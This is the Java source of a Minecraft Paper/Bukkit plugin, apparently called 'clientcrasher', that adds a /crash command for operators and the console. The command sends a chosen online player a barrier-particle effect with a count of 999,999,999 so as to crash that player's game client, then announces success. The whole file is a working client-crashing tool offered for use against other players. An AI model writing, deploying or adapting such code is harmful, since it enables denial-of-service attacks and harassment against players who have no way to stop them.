package riyaya1528.paper.clientcrasher;

import org.bukkit.Bukkit;
import org.bukkit.Effect;
import org.bukkit.Particle;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Commands implements CommandExecutor {
    public Player ToPlayer = null;
    public Player FromPlayer = null;

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if(command.getName().equals("crash")) {
            if (sender instanceof Player) {
                if (sender.isOp()) {
                    if (args[0].length() != 0) {
                        if (Bukkit.getServer().getPlayer(args[0]) != null && Bukkit.getServer().getPlayer(args[0]).isOnline()) {
                            ToPlayer = Bukkit.getServer().getPlayer(args[0]);
                            FromPlayer = (Player) sender;
                            CrashClientFromPlayer();

                        } else {
                            sender.sendMessage("§c§lPlease select exist or online player");
                        }
                    } else {
                        sender.sendMessage("§c§lPlease select player");
                    }
                } else {
                    sender.sendMessage("§c§lYou aren't OP");
                }
            } else {
                if (args[0].length() != 0) {
                    if (Bukkit.getServer().getPlayer(args[0]) != null && Bukkit.getServer().getPlayer(args[0]).isOnline()) {
                        ToPlayer = Bukkit.getServer().getPlayer(args[0]);
                        FromPlayer = null;
                        CrashClientFromConsole();

                    } else {
                        System.out.println("§c§lPlease select exist or online player");
                    }
                } else {
                    System.out.println("§c§lPlease select player");
                }
            }
        }
        return true;
    }

    private void CrashClientFromPlayer() {
        ToPlayer.spawnParticle(Particle.BARRIER,ToPlayer.getLocation(),999999999);

        FromPlayer.sendMessage("§a§lSuccess! The player's Client has been crashed!");
    }

    private void CrashClientFromConsole() {
        ToPlayer.spawnParticle(Particle.BARRIER,ToPlayer.getLocation(),999999999);

        System.out.println("§a§lSuccess! The player's Client has been crashed!");
    }

}
